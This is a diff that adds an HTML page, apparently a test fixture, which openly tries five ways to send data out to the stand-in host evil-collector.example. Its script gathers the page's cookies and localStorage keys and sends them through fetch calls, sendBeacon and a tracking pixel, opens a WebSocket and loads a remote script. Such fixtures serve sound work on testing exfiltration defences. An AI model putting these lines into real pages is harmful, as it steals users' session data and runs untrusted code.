@@ -1,0 +1,11 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Attack: data exfiltration</title></head>
+<body style="font-family:system-ui;margin:48px"><h1>Exfiltration attempts</h1><p>This page tries five ways to send data to evil-collector.example.</p>
+<img src="https://evil-collector.example/pixel.gif?d=img">
+<script>
+ const d = encodeURIComponent(JSON.stringify({cookie: document.cookie, ls: Object.keys(localStorage)}));
+ fetch('https://evil-collector.example/f?d=' + d, {mode:'no-cors'}).catch(()=>{});
+ fetch('http://evil-collector.example:8080/plain?d=' + d).catch(()=>{});
+ navigator.sendBeacon('https://evil-collector.example/b', d);
+ try { new WebSocket('wss://evil-collector.example/ws'); } catch(e) {}
+ const s = document.createElement('script'); s.src = 'https://evil-collector.example/s.js'; document.body.appendChild(s);
+</script></body></html>
